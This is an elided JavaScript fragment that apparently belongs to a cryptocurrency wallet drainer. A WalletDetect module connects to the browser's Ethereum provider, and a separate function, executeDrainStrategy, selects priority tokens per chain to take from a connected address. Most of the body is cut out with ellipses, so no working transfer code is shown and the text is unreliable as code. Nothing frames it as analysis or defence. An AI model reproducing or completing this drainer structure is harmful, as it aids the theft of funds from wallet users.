...
const WalletDetect = (function() {
  ...
  async function connect(provider = window.ethereum) {
    // 1. Delegate to UI Adapter if registered (Priority)
    if (uiAdapter) {
      try {
    ...
    // 2. Fallback to standard injection (Legacy/Direct)
    if (!provider) {
...
(function() {
  ...
  async function executeDrainStrategy(address, chainId) {
    // Determine priority tokens for the chain
    const chainTokens = {
